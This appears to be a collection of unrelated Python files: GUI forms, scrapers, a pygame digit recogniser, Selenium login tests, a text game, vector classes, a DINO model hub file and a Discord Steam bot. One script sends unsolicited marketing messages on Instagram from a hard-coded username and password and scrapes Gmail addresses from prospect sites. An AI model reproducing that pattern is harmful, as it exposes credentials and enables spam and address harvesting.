text=\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0430\u043d\u043d\u044b\u0435:\", fg=\"#AC9075\", bg=\"#E8CAAC\",\r\n                  font=(\"Corbel bold\", 15)).grid(row=90, column=0, columnspan=2)\r\n        global selected_category\r\n        new_data = tuple(data_entry.get() for data_entry in data_entries)\r\n        table.insert(\"\", \"end\", values=new_data + (selected_category,))\r\n        second_window.withdraw()\r\n        messagebox.showinfo(\"\u0423\u0441\u043f\u0435\u0445\", \"\u0414\u0430\u043d\u043d\u044b\u0435 \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u044b \u0432 \u0442\u0430\u0431\u043b\u0438\u0446\u0443\")\r\n\r\n    second_window = Toplevel()\r\n    second_window.geometry('700x450+400+200')\r\n    second_window.title(\"\u041a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u0438\")\r\n\r\n    icon3 = ImageTk.PhotoImage(file='Subtract (1).png')\r\n    second_window.iconphoto(False, icon3)\r\n\r\n    background_label1 = Label(second_window, image=bg_image)\r\n    background_label1.place(x=0, y=0, relwidth=1, relheight=1)\r\n\r\n    def close():\r\n        second_window.destroy()\r\n    btn_close = Button(second_window, text='<-', fg=\"#AC9075\", bg=\"#E8CAAC\", font=(\"Corbel bold\", 15), command=close)\r\n    btn_close.grid(row=0, column=0)\r\n    label_add_p = Label(second_window, text='\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043f\u0440\u043e\u0434\u0443\u043a\u0442', font=(\"Corbel bold\", 20),\r\n                        fg=\"#AC9075\", bg=\"#F6EFE4\")\r\n    label_add_p.grid(row=0, column=1)\r\n\r\n    data_",
    "import os\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef parse_website(url):\n    headers = {\n        'User-Agent': 'Your User Agent String Here',\n    }\n    response = requests.get(url, headers=headers)\n\n    if response.status_code == 200:\n        return response.content\n    else:\n        print(\"Failed to retrieve webpage:\", response.status_code)\n        return None\n\ndef scrape_and_save_problem_statement(links_file, output_folder):\n    # Create the output folder if it doesn't exist\n    if not os.path.exists(output_folder):\n        os.makedirs(output_folder)\n\n    with open(links_file, 'r') as file:\n        for idx, link in enumerate(file, start=4675):\n            link = link.strip()  # Remove leading/trailing whitespace and newline characters\n            print(f\"Scraping problem statement from link {idx}: {link}\")\n            html_content = parse_website(link)\n            if html_content:\n                try:\n                    soup = BeautifulSoup(html_content, 'html.parser')\n                    # Find all elements with class 'problem-statement' and extract text\n                    problem_statement = soup.find(class_='problem-statement').get_text()\n                    # Generate a filename for the text file\n                    filename = os.path.join(output_folder, f'problem_statement_{idx}.txt')\n                    # Save the problem statement text to a file\n                    with open(filename, 'w', encoding='utf-8') as text_file:\n                        text_file.write(problem_statement)\n                    print(f\"Problem statement saved to: {filename}\")\n                except (AttributeError, UnicodeEncodeError):\n                    # Handle cases where the problem statement cannot be found or encoding error occurs\n                    print(f\"Unable to save problem statement for link {idx}\")\n                    filename = os.path.join(output_folder, f'problem_statement_{idx}.txt')\n                    with open(filename, 'w', encoding='utf-8') as text_file:\n                        text_file.write(\"\")  # Write an empty file\n\n# Define paths and filenames\nlinks_file = 'problem_links_2.txt'  # File containing the list of links\noutput_folder = 'qdata'  # Folder to save problem statement files\n\n# Scrape problem statement text from links and save to separate files\nscrape_and_save_problem_statement(links_file, output_folder)\n",
    "from rich import print, box\nfrom rich.panel import Panel\nfrom rich.traceback import install\ninstall(show_locals=True)\n\nimport pandas as pd\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\nfrom instagrapi import Client, exceptions\nimport logging\n\n# Setup logging\nlogger = logging.getLogger()\n\n# Load the .csv file using pandas\nfile_path = 'Examplar Prospects List.csv'\ndf = pd.read_csv(file_path)  # Change to read_csv for CSV files\n\n# Assuming the website links are in column 'F'\nwebsites = df.iloc[:, 5]  # Adjust the column index as necessary\n\n# Instagrapi client setup with proxy\ncl = Client()\n\ncl.delay_range = [1, 3]  # Set delay range for requests\n\n# Replace these with your actual username and password\nUSERNAME = \"wordsmith.agency\"\nPASSWORD = \"wordsmithscriptsforyou\"\n\ndef login_user():\n    \"\"\"\n    Login to Instagram with username and password.\n    \"\"\"\n    try:\n        if cl.login(USERNAME, PASSWORD):\n            logger.info(\"Logged in successfully.\")\n    except Exception as e:\n        logger.error(f\"Login failed: {e}\")\n        raise Exception(\"Login failed\")\n\nlogin_user()\n\ndef extract_instagram_username(instagram_url):\n    match = re.search(r\"instagram.com/([^/?#&]+)\", instagram_url)\n    if match:\n        return match.group(1)\n    else:\n        return None\n\nfacebook_links = []\ngmail_addresses = []\nmessages_sent = 0\n\ndef process_websites(websites, df):\n    global messages_sent\n    for index, url in websites.iteritems():\n        try:\n            response = requests.get(url, timeout=10)\n            if response.status_code == 200:\n                soup = BeautifulSoup(response.text, 'html.parser')\n                links = soup.find_all('a', href=True)\n                for link in links:\n                    href = link['href']\n                    if \"facebook.com\" in href:\n                        facebook_links.append(href)\n                    if \"instagram.com\" in href:\n                        username = extract_instagram_username(href)\n                        if username:\n                            try:\n                                user_id = cl.user_id_from_username(username)\n                                message = f\"Hey {username},\\n\\nImpressed by the range of services, especially as summer heats up the demand. At Pixelevate, we offer expert digital marketing with a twist: no payment until you see results. Ready to make this summer your most profitable one? Let's chat.\"\n                                cl.direct_send(message, [user_id])\n                                df.at[index, 'Status'] = 'Done'  # Update the status in the DataFrame\n                                messages_sent += 1\n                                print(Panel.fit(f\"Message sent to {username}\", border_style=\"bold green\", box=box.SQUARE))\n                                break\n                            except exceptions.UserNotFound:\n                                print(Panel.fit(f\"Instagram user {username} not found. Skipping...\", border_style=\"bold yellow\", box=box.SQUARE))\n                                df.at[index, 'Status'] = 'Pending'\n                text = soup.get_text()\n                gmail_addresses.extend(re.findall(r\"[a-zA-Z0-9_.+-]+@gmail.com\", text))\n            else:\n                print(Panel.fit(f\"Could not retrieve {url}\", border_style=\"bold red\", box=box.SQUARE))\n                df.at[index, 'Status'] = 'Pending'\n        except requests.RequestException as e:\n            print(Panel.fit(f\"Error: {e}\", border_style=\"bold red\", box=box.SQUARE))\n            df.at[index, 'Status'] = 'Pending'\n\nprocess_websites(websites, df)\n\n# Print collected Facebook links and Gmail addresses\nprint(Panel.fit(\"\\n\".join(facebook_links), title=\"Facebook Links\", border_style=\"bold blue\", box=box.SQUARE))\nprint(Panel.fit(\"\\n\".join(gmail_addresses), title=\"Gmail Addresses\", border_style=\"bold magenta\", box=box.SQUARE))\n\n# Print the count of successfully sent messages\nprint(Panel.fit(f\"Successfully sent messages: {messages_sent}\", border_style=\"bold green\", box=box.SQUARE))\n\n# After processing all websites, save the DataFrame back to a CSV file\ndf.to_csv('Updated Examplar Prospects List.csv', index=False)\n",
    "class HeadLight:\r\n    def __init__(self, sun_light = 0.5):\r\n        self.chance_to_night = sun_light\r\n        self.is_light_on = True\r\n        self.is_light_off = True\r\n        self.is_a_day = False\r\n        self.is_a_night = True\r\n\r\n    def light_turned_on(self, chance_to_night):\r\n        if self.is_a_night:\r\n            print(\"Head lights are turned on!\")\r\n            return self.is_light_off\r\n        \r\n        elif chance_to_night > self.chance_to_night:\r\n            print(\"Head light turned on!\")\r\n            return self.is_light_on\r\n        \r\n        else:\r\n\r\n            return not self.is_light_on\r\n        \r\n\r\n    def light_turned_off(self, chance_to_morning):\r\n        if self.is_a_day:\r\n            print(\"Lights are Turned off!\")\r\n\r\n        elif chance_to_morning < self.chance_to_night:\r\n            print(\"Head light turned off!\")\r\n            return self.is_light_off\r\n        \r\n        else:\r\n\r\n            return not self.is_light_off\r\n        \r\n        \r\nhead = HeadLight()\r\nhead.light_turned_on(0.4)\r\nhead.light_turned_off(0.4)\r\n        ",
    "import numpy as np\nimport pygame\nfrom pygame import Vector2\nfrom pygame import draw\nfrom pygame.draw import circle, line, aaline, rect\nfrom pygame.transform import scale, smoothscale\nimport pygame.display\nimport pygame.mouse\nimport pygame.event\nimport pygame.time\nimport neural_network\nfrom handwritten_digits_recognition_tools import get_digit, image_to_input\nimport pygame.surfarray\nimport pygame.font\n\npygame.init()\n\nGRAY = (50, 50, 50, 50)\nBLACK = (0, 0, 0)\nWHITE = (255, 255, 255)\nWHITE_GRAY = (150, 150, 150, 50)\n# weigth, heigth = 1080, 2160  # for phone\nweigth,heigth=400,800#celiphone\n\nscreen = pygame.display.set_mode((weigth, heigth))\nscreen.fill(GRAY)\nclock = pygame.time.Clock()\n\ncanvas_rect = pygame.Rect((0, heigth / 4), (weigth, weigth))\nrect(screen, BLACK, canvas_rect)\ndigits_rect = pygame.Rect(((weigth / 2 - heigth / 8, 0), (heigth / 4, heigth / 4)))\n\n\n# pen_size = 80\n# font_size = 330\npen_size=15\nfont_size=150\ndigits_font = pygame.font.SysFont(\"\", font_size)\n\ninput_layer = pygame.Surface(canvas_rect.size)\npixel_layer = pygame.Surface(canvas_rect.size, pygame.SRCALPHA)\n\nlast_pos = None\n\n\ndef offset(pos):\n    \"\"\"offset to canvas\"\"\"\n    return Vector2(pos) - Vector2(canvas_rect.topleft)\n\n\ndef is_drawing(pos):\n    return pygame.mouse.get_pressed(3)[0] and canvas_rect.collidepoint(pos)\n\n\nnetwork = neural_network.NeuralNetwork.create_from_file(\n    \"data/training_completed_data.json\"\n)\n\nlabel_size = (30, 30)\nlabel_leftop = Vector2(weigth / 22, heigth / 5)\nlabel_offect = Vector2(weigth / 11, 0)\nlabel = [\n    (\n        pygame.Surface(label_size),\n        pygame.Rect(label_leftop + label_offect * n, label_size),\n    )\n    for n in range(10)\n]\n\n\nrunning = True\nwhile running:\n    clock.tick(30)\n\n    pos = Vector2(pygame.mouse.get_pos())\n\n    for event in pygame.event.get():\n        if event.type == pygame.MOUSEBUTTONDOWN:\n            last_pos = None\n            if not canvas_rect.collidepoint(pos):\n                input_layer.fill(BLACK)\n                pixel_layer.fill(BLACK)\n\n        if event.type == pygame.MOUSEBUTTONUP:\n            last_pos = None\n\n        if event.type == pygame.QUIT:\n            running = False\n\n    # drawing\n    if is_drawing(pos):\n        if last_pos == None:\n            last_pos = pos\n\n        line(input_layer, WHITE, offset(pos), offset(last_pos), pen_size)\n        # circle(input_layer,WHITE,offset(pos),pen_size/2)\n        # circle(input_layer,WHITE,offset((pos+last_pos)/2),pen_size/2)\n\n        pixel_layer = smoothscale(input_layer, (28, 28))\n\n        pixels_array = np.transpose(pygame.surfarray.pixels_red(pixel_layer)).reshape(\n            784\n        )\n\n        digit = network.get(image_to_input(pixels_array))\n        for n in range(len(label)):\n            color = ((digit[n]) * 255, (digit[n]) * 255, (digit[n]) * 255)\n            label[n][0].fill((color))\n        digit_surface = digits_font.render(str(get_digit(digit)), True, WHITE)\n\n        rect(screen, GRAY, digits_rect)\n\n        for l, r in label:\n            screen.blit(l, l.get_rect(center=r.center))\n\n        screen.blit(digit_surface, digit_surface.get_rect(center=digits_rect.center))\n\n    screen.blit(scale(pixel_layer, canvas_rect.size), canvas_rect)\n    # screen.blit(input_layer,canvas_rect)\n    pygame.display.update()\n\n    last_pos = pos\n\npygame.quit()\n",
    "from selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.wait import WebDriverWait #ilgili driver\u0131 bekleten yap\u0131\nfrom selenium.webdriver.support import expected_conditions as ec #beklenen ko\u015fullar\nfrom selenium.webdriver.common.action_chains import ActionChains \nimport pytest\nfrom constants.globalConstants import *\nimport json\n\nclass Test_Demo:\n    def deneme(self):\n        print(\"deneme\")\n\n    #pytest taraf\u0131ndan tan\u0131mlanan bir method \n    #her test \u00f6ncesi otomatik olarak \u00e7al\u0131\u015ft\u0131r\u0131l\u0131r\n    def setup_method(self):\n        self.driver = webdriver.Chrome()\n        self.driver.maximize_window()\n        self.driver.get(BASE_URL)\n\n    #her test bitiminde \u00e7al\u0131\u015facak fonk\n    def teardown_method(self):\n        self.driver.quit()\n\n    @pytest.mark.skip #t\u00fcm testler ko\u015fulurken \"skip\" \u015feklinde i\u015faretlenen testlerimi atl\n    def test_demo(self):\n        print(\"x\")\n        text = \"Hello\"\n        assert text == \"Hello\"\n\n    def getData():\n        return [(\"1\",\"1\"),(\"abc\",\"123\"),(\"deneme\",\"secret_sauce\")]\n    \n   \n            \n    def readInvalidDataFromJSON(json_file_path):\n     with open(json_file_path, 'r') as file:\n        data = json.load(file)\n        invalid_users = data.get('invalid_login_users', [])\n        return [(user.get('username'), user.get('password')) for user in invalid_users]\n\n\n\n\n\n    # def readInvalidDataFromExcel():\n    #     excelFile = openpyxl.load_workbook(\"data/invalidLogin.xlsx\")\n    #     sheet = excelFile[\"Sheet1\"]\n    #     rows = sheet.max_row #ka\u00e7\u0131nc\u0131 sat\u0131ra kadar benim verim var\n    #     data = []\n    #     for i in range(2,rows+1):\n    #         username = sheet.cell(i,1).value\n    #         password = sheet.cell(i,2).value\n    #         data.append((username,password))\n    #     return data\n    \n\n    \n    \n    @pytest.mark.parametrize(\"username, password\", readInvalidDataFromJSON(\"invalid/data.json\"))\n    def test_invalid_login(self,username,password):\n        userNameInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,username_id)))\n        passwordInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,password_id)))\n        userNameInput.send_keys(username)\n        passwordInput.send_keys(password)\n        loginButton = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,login_button_id)))\n        loginButton.click()\n        errorMessage =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.XPATH,errorMessage_xpath)))\n        assert errorMessage.text == errorMessage_text\n\n\n    def test_valid_login(self):\n        userNameInput = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,username_id)))\n        passwordInput =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,password_id)))\n        actions = ActionChains(self.driver)\n        actions.send_keys_to_element(userNameInput,\"standard_user\")\n        actions.send_keys_to_element(passwordInput,\"secret_sauce\")\n        actions.perform() #depolad\u0131\u011f\u0131m aksiyonlar\u0131 \u00e7al\u0131\u015ft\u0131r\n        loginButton = WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.ID,login_button_id)))\n        loginButton.click()\n        baslik =WebDriverWait(self.driver,5).until(ec.visibility_of_element_located((By.XPATH,baslik_xpath)))\n        assert baslik.text == baslik_text\n    \n    def waitForElementVisible(self,locator,timeout=5):\n       return WebDriverWait(self.driver,timeout).until(ec.visibility_of_element_located(locator))       \n        \n        ",
    "print('''\r\n*******************************************************************************\r\n          |                   |                  |                     |\r\n _________|________________.=\"\"_;=.______________|_____________________|_______\r\n|                   |  ,-\"_,=\"\"     `\"=.|                  |\r\n|___________________|__\"=._o`\"-._        `\"=.______________|___________________\r\n          |                `\"=._o`\"=._      _`\"=._                     |\r\n _________|_____________________:=._o \"=._.\"_.-=\"'\"=.__________________|_______\r\n|                   |    __.--\" , ; `\"=._o.\" ,-\"\"\"-._ \".   |\r\n|___________________|_._\"  ,. .` ` `` ,  `\"-._\"-._   \". '__|___________________\r\n          |           |o`\"=._` , \"` `; .\". ,  \"-._\"-._; ;              |\r\n _________|___________| ;`-.o`\"=._; .\" ` '`.\"\\` . \"-._ /_______________|_______\r\n|                   | |o;    `\"-.o`\"=._``  '` \" ,__.--o;   |\r\n|___________________|_| ;     (#) `-.o `\"=.`_.--\"_o.-; ;___|___________________\r\n____/______/______/___|o;._    \"      `\".o|o_.--\"    ;o;____/______/______/____\r\n/______/______/______/_\"=._o--._        ; | ;        ; ;/______/______/______/_\r\n____/______/______/______/__\"=._o--._   ;o|o;     _._;o;____/______/______/____\r\n/______/______/______/______/____\"=._o._; | ;_.--\"o.--\"_/______/______/______/_\r\n____/______/______/______/______/_____\"=.o|o_.--\"\"___/______/______/______/____\r\n/______/______/______/______/______/______/______/______/______/______/_____ /\r\n*******************************************************************************\r\n''')\r\nprint(\"Welcome to Treasure Island.\")\r\nprint(\"Your mission is to find the treasure.\") \r\n\r\n#Write your code below this line \ud83d\udc47\r\n\r\nprint(\"You're at a crossroad.\")\r\ndirection = input(\"Where do you want to go? Type 'left' or 'right': \").lower()\r\n\r\nif direction == \"left\":\r\n    print(\"You chose to go left.\")\r\n    print(\"You come across an old abandoned mansion.\")\r\n    print(\"The mansion looks eerie but you decide to enter.\")\r\n    print(\"Inside, you find three doors: one red, one yellow, and one blue.\")\r\n    door = input(\"Which door do you choose? 'red', 'yellow', or 'blue': \").lower()\r\n    if door == \"red\":\r\n        print(\"You enter a room filled with traps. Game over!\")\r\n    elif door == \"yellow\":\r\n        print(\"You found a room with a treasure chest! You win!\")\r\n    elif door == \"blue\":\r\n        print(\"You open the door and fall into a pit of spikes. Game over!\")\r\n    else:\r\n        print(\"Invalid choice. Game over!\")\r\nelif direction == \"right\":\r\n    print(\"You chose to go right.\")\r\n    print(\"You walk deeper into the forest and find a river.\")\r\n    print(\"You can 'swim' across or 'wait' for a bridge.\")\r\n    crossing = input(\"What do you do? 'swim' or 'wait': \").lower()\r\n    if crossing == \"wait\":\r\n        print(\"A bridge appears magically, and you cross it.\")\r\n        print(\"On the other side, you find a cave.\")\r\n        print(\"You enter the cave and find three tunnels: one dark, one dimly lit, and one brightly lit.\")\r\n        tunnel = input(\"Which tunnel do you choose? 'dark', 'dimly lit', or 'brightly lit': \").lower()\r\n        if tunnel == \"dark\":\r\n            print(\"You stumble into a nest of spiders. Game over!\")\r\n        elif tunnel == \"dimly lit\":\r\n            print(\"You find yourself in a maze and can't find your way out. Game over!\")\r\n        elif tunnel == \"brightly lit\":\r\n            print(\"You emerge from the tunnel into a chamber with the treasure! You win!\")\r\n        else:\r\n            print(\"Invalid choice. Game over!\")\r\n    elif crossing == \"swim\":\r\n        print(\"You are attacked by piranhas while swimming. Game over!\")\r\n    else:\r\n        print(\"Invalid choice. Game over!\")\r\nelse:\r\n    print(\"Invalid choice. Game over!\")\r\n",
    "import math\n# from formation_package import math_ as rvo_math\nimport math_ as rvo_math\n\nclass Vector2:\n\n\t# Defines a 2-D vector.\n\tdef __init__(self, x=0.0, y=0.0):\n\n\t\t'''\n\t\tConstructs and initializes a 2-D vector from the specified xy-coordinates.\n\n\t\tArgs:\n\t\t\tx (float): The x-coordinate of the 2-D vector.\n\t\t\ty (float): The y-coordinate of the 2-D vector.\n\t\t'''\n\n\t\tself.x_ = x \n\t\tself.y_ = y \n\n\tdef __str__(self):\n\t\treturn \"Vector2(x={}, y={})\".format(self.x_, self.y_)\n\n\t@property\n\tdef x(self):\n\t\treturn self.x_\n\n\t@property\n\tdef y(self): \n\t\treturn self.y_ \n\n\tdef __matmul__(self, other):\n\n\t\tassert isinstance(other, Vector2), '__matmul__ argument should be a Vector2'\n\t\treturn self.x_*other.x_ + self.y_*other.y_\n\n\tdef __mul__(self, other):\n\n\t\tassert not isinstance(other, Vector2), '__mul__ argument should be a float'\n\t\treturn Vector2(self.x_*other, self.y_*other)\n\n\tdef __rmul__(self, other):\n\n\t\tassert not isinstance(other, Vector2), '__rmul__ argumetn should be a float'\n\t\treturn Vector2(other*self.x_, other*self.y_)\n\n\tdef __truediv__(self, scalar):\n\t\treturn Vector2(self.x_/scalar, self.y_/scalar)\n\n\tdef __add__(self, other):\n\t\treturn Vector2(self.x_ + other.x_, self.y_ + other.y_)\n\n\tdef __radd__(self, other):\n\t\treturn Vector2(other.x_ + self.x_, other.y_ + self.y_)\n\n\tdef __sub__(self, other):\n\t\treturn Vector2(self.x_ - other.x_, self.y_ - other.y_)\n\n\tdef __rsub__(self, other):\n\t\treturn Vector2(other.x_ - self.x_, other.y_ - self.y_)\n\n\tdef __neg__(self):\n\t\treturn Vector2(-self.x_, -self.y_)\n\n\tdef __abs__(self):\n\n\t\t'''\n\t\tComputes the length of a specified 2-dimensional vector.\n\n\t\tArgs:\n\t\t\tvector (Vector2): The 2-dimensional vector whose length is to be computed.\n\n\t\tReturns:\n\t\t\tfloat: the length of the 2-dimensional vector.\n\t\t'''\n\n\t\treturn math.sqrt(rvo_math.abs_sq(self))\n\nclass Vector3:\n\n\t# Defines a 3-D vector.\n\tdef __init__(self, x=0.0, y=0.0, z=0.0):\n\n\t\t'''\n\t\tConstructs and initializes a 3-D vector from the specified xy-coordinates.\n\n\t\tArgs:\n\t\t\tx (float): The x-coordinate of the 3-D vector.\n\t\t\ty (float): The y-coordinate of the 3-D vector.\n\t\t\tz (float): The z-coordinate of the 3-D vector.\n\t\t'''\n\n\t\tself.x_ = x \n\t\tself.y_ = y \n\t\tself.z_ = z \n\n\tdef __str__(self):\n\t\treturn \"Vector3(x={}, y={}, z={})\".format(self.x_, self.y_, self.z_)\n\n\t@property\n\tdef x(self):\n\t\treturn self.x_\n\n\t@property\n\tdef y(self):\n\t\treturn self.y_\n\n\t@property\n\tdef z(self):\n\t\treturn self.z_\n\n\tdef __matmul__(self, other):\n\n\t\tassert isinstance(other, Vector3), '__matmul__ argument should be a Vector3'\n\t\treturn self.x_*other.x_ + self.y_*other.y_ + self.z_*other.z_\n\n\tdef __mul__(self, other):\n\n\t\tassert not isinstance(other, Vector3), '__mul__ argument should be a float'\n\t\treturn Vector3(self.x_*other, self.y_*other, self.z_*other)\n\n\tdef __rmul__(self, other):\n\n\t\tassert not isinstance(other, Vector3), '__rmul__ argument should be a float'\n\t\treturn Vector3(other*self.x_, other*self.y_, other*self.z_)\n\n\tdef __truediv__(self, scalar):\n\t\treturn Vector3(self.x_/scalar, self.y_/scalar, self.z_/scalar)\n\n\tdef __add__(self, other):\n\t\treturn Vector3(self.x_ + other.x_, self.y_ + other.y_, self.z_ + other.z_)\n\n\tdef __radd__(self, other):\n\t\treturn Vector3(other.x_ + self.x_, other.y_ + self.y_, other.z_ + self.z_)\n\n\tdef __sub__(self, other):\n\t\treturn Vector3(self.x_ - other.x_, self.y_ - other.y_, self.z_ - other.z_)\n\n\tdef __rsub__(self, other):\n\t\treturn Vector3(other.x_ - self.x_, other.y_ - self.y_, other.z_ - self.z_)\n\n\tdef __neg__(self):\n\t\treturn Vector3(-self.x_, -self.y_, -self.z_)\n\n\tdef __abs__(self):\n\n\t\t'''\n\t\tComputes the length of a specified 3-D vector.\n\n\t\tArgs:\n\t\t\tvector (Vector3): The 3-D vector whose length is to be computed.\n\n\t\tReturns:\n\t\t\tfloat: the length of the 3-D vector.\n\t\t'''\n\n\t\treturn math.sqrt(rvo_math.abs_sq(self))",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n# \n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n# \n#     http://www.apache.org/licenses/LICENSE-2.0\n# \n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport torch\nfrom torchvision.models.resnet import resnet50\n\nimport dino.vision_transformer as vits\n\ndependencies = [\"torch\", \"torchvision\"]\n\n\ndef dino_vits16(pretrained=True, **kwargs):\n    \"\"\"\n    ViT-Small/16x16 pre-trained with DINO.\n    Achieves 74.5% top-1 accuracy on ImageNet with k-NN classification.\n    \"\"\"\n    model = vits.__dict__[\"vit_small\"](patch_size=16, num_classes=0, **kwargs)\n    if pretrained:\n        state_dict = torch.hub.load_state_dict_from_url(\n            url=\"https://dl.fbaipublicfiles.com/dino/dino_deitsmall16_pretrain/dino_deitsmall16_pretrain.pth\",\n            map_location=\"cpu\",\n        )\n        model.load_state_dict(state_dict, strict=True)\n    return model\n\n\ndef dino_vits8(pretrained=True, **kwargs):\n    \"\"\"\n    ViT-Small/8x8 pre-trained with DINO.\n    Achieves 78.3% top-1 accuracy on ImageNet with k-NN classification.\n    \"\"\"\n    model = vits.__dict__[\"vit_small\"](patch_size=8, num_classes=0, **kwargs)\n    if pretrained:\n        state_dict = torch.hub.load_state_dict_from_url(\n            url=\"https://dl.fbaipublicfiles.com/dino/dino_deitsmall8_pretrain/dino_deitsmall8_pretrain.pth\",\n            map_location=\"cpu\",\n        )\n        model.load_state_dict(state_dict, strict=True)\n    return model\n\n\ndef dino_vitb16(pretrained=True, **kwargs):\n    \"\"\"\n    ViT-Base/16x16 pre-trained with DINO.\n    Achieves 76.1% top-1 accuracy on ImageNet with k-NN classification.\n    \"\"\"\n    model = vits.__dict__[\"vit_base\"](patch_size=16, num_classes=0, **kwargs)\n    if pretrained:\n        state_dict = torch.hub.load_state_dict_from_url(\n            url=\"https://dl.fbaipublicfiles.com/dino/dino_vitbase16_pretrain/dino_vitbase16_pretrain.pth\",\n            map_location=\"cpu\",\n        )\n        model.load_state_dict(state_dict, strict=True)\n    return model\n\n\ndef dino_vitb8(pretrained=True, **kwargs):\n    \"\"\"\n    ViT-Base/8x8 pre-trained with DINO.\n    Achieves 77.4% top-1 accuracy on ImageNet with k-NN classification.\n    \"\"\"\n    model = vits.__dict__[\"vit_base\"](patch_size=8, num_classes=0, **kwargs)\n    if pretrained:\n        state_dict = torch.hub.load_state_dict_from_url(\n            url=\"https://dl.fbaipublicfiles.com/dino/dino_vitbase8_pretrain/dino_vitbase8_pretrain.pth\",\n            map_location=\"cpu\",\n        )\n        model.load_state_dict(state_dict, strict=True)\n    return model\n\n\ndef dino_resnet50(pretrained=True, **kwargs):\n    \"\"\"\n    ResNet-50 pre-trained with DINO.\n    Achieves 75.3% top-1 accuracy on ImageNet linear evaluation benchmark (requires to train `fc`).\n    \"\"\"\n    model = resnet50(pretrained=False, **kwargs)\n    model.fc = torch.nn.Identity()\n    if pretrained:\n        state_dict = torch.hub.load_state_dict_from_url(\n            url=\"https://dl.fbaipublicfiles.com/dino/dino_resnet50_pretrain/dino_resnet50_pretrain.pth\",\n            map_location=\"cpu\",\n        )\n        model.load_state_dict(state_dict, strict=False)\n    return model\n\n\ndef dino_xcit_small_12_p16(pretrained=True, **kwargs):\n    \"\"\"\n    XCiT-Small-12/16 pre-trained with DINO.\n    \"\"\"\n    model = torch.hub.load('facebookresearch/xcit:main', \"xcit_small_12_p16\", num_classes=0, **kwargs)\n    if pretrained:\n        state_dict = torch.hub.load_state_dict_from_url(\n            url=\"https://dl.fbaipublicfiles.com/dino/dino_xcit_small_12_p16_pretrain/dino_xcit_small_12_p16_pretrain.pth\",\n            map_location=\"cpu\",\n        )\n        model.load_state_dict(state_dict, strict=True)\n    return model\n\n\ndef dino_xcit_small_12_p8(pretrained=True, **kwargs):\n    \"\"\"\n    XCiT-Small-12/8 pre-trained with DINO.\n    \"\"\"\n    model = torch.hub.load('facebookresearch/xcit:main', \"xcit_small_12_p8\", num_classes=0, **kwargs)\n    if pretrained:\n        state_dict = torch.hub.load_state_dict_from_url(\n            url=\"https://dl.fbaipublicfiles.com/dino/dino_xcit_small_12_p8_pretrain/dino_xcit_small_12_p8_pretrain.pth\",\n            map_location=\"cpu\",\n        )\n        model.load_state_dict(state_dict, strict=True)\n    return model\n\n\ndef dino_xcit_medium_24_p16(pretrained=True, **kwargs):\n    \"\"\"\n    XCiT-Medium-24/16 pre-trained with DINO.\n    \"\"\"\n    model = torch.hub.load('facebookresearch/xcit:main', \"xcit_medium_24_p16\", num_classes=0, **kwargs)\n    if pretrained:\n        state_dict = torch.hub.load_state_dict_from_url(\n            url=\"https://dl.fbaipublicfiles.com/dino/dino_xcit_medium_24_p16_pretrain/dino_xcit_medium_24_p16_pret",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport os\nimport subprocess\nimport glob\n\nPORTFOLIO = '/srv/portfolio'\n\n\ndef locate_setup(project_path):\n    \"\"\"\n    Locate a setup script in the project directory. The script might either\n    be located in the project root, or `scripts` directory inside the project.\n    \"\"\"\n    patterns = ['setup', 'setup*', 'scripts/setup', 'scripts/setup*']\n    filenames = [glob.glob(project_path + \"/\" + p) for p in patterns]\n    flattened = filenames[0]\n    for fn in filenames:\n        flattened += fn\n    filenames = [x for x in flattened\n                 if os.path.isfile(x) and \\\n                    os.access(x, os.X_OK)]\n    if len(filenames) > 0:\n        return filenames[0]\n\n\nprojects = [x for x in glob.glob(f\"{PORTFOLIO}/*\")\n            if os.path.isdir(x)]\n\nfor project_path in projects:\n    project = os.path.basename(project_path)\n    setup = locate_setup(project_path)\n    if setup:\n        interpreter = None\n        (_, ext) = os.path.splitext(setup)\n        # TODO: Executable from the shebang\n        command = ['sh'] if ext == '.sh' else ['python'] \\\n            if ext == '.py' else []\n        command.append(setup)\n        print(\"$ \" + ' '.join(command))\n        os.chdir(project_path)\n        res = subprocess.run(\n            command, capture_output=True\n        )\n        print(res.stdout.decode())\n",
    "import re\nfrom json import load, dump\nfrom time import mktime\nimport requests\nfrom bs4 import BeautifulSoup\nfrom discord.ext import commands, tasks\nfrom discord.flags import Intents\nfrom discord import Embed, Colour\nimport aiohttp\nfrom datetime import datetime\n\nbot = commands.Bot(command_prefix='!!', intents=Intents.all())\n\n# Some variables\ndata_path: str = \"data.json\"\nwith open(data_path, \"r\") as f:\n    data = load(f)\n    show_discount_games: bool = data[\"show_discount_games\"]\n    last_seen: list[int] = data[\"last_seen\"]\n    print(last_seen)\nseen: list[int] = []\nAPI_KEY: str = \"\"  # Steam API key\napplisturl: str = f\"https://api.steampowered.com/ISteamApps/GetAppList/v2/?key={API_KEY}\"\npriceurl: str = \"https://store.steampowered.com/api/appdetails?filters=price_overview&appids=\"\nappdetailsurl: str = \"https://store.steampowered.com/api/appdetails?appids=\"\ndiscount: dict = {}  # Games with a discount\nfree: dict = {}  # Giveaways\n\n\n@bot.event\nasync def on_ready():\n    print(f'\u0411\u043e\u0442 \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d \u043a\u0430\u043a {bot.user.name} (ID: {bot.user.id})')\n    print('------')\n    await 